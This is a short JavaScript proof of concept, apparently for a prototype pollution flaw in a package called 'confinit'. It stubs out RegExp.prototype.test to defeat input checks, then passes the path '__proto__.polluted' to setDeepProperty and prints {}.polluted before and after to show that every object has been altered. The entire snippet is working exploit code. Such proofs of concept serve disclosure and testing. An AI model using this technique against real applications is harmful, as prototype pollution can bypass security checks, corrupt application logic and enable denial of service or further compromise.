RegExp.prototype.test = () => false;
const root = require('confinit');
const payload = '__proto__.polluted';
console.log({}.polluted);
root.setDeepProperty({}, payload, 'yes');
console.log({}.polluted);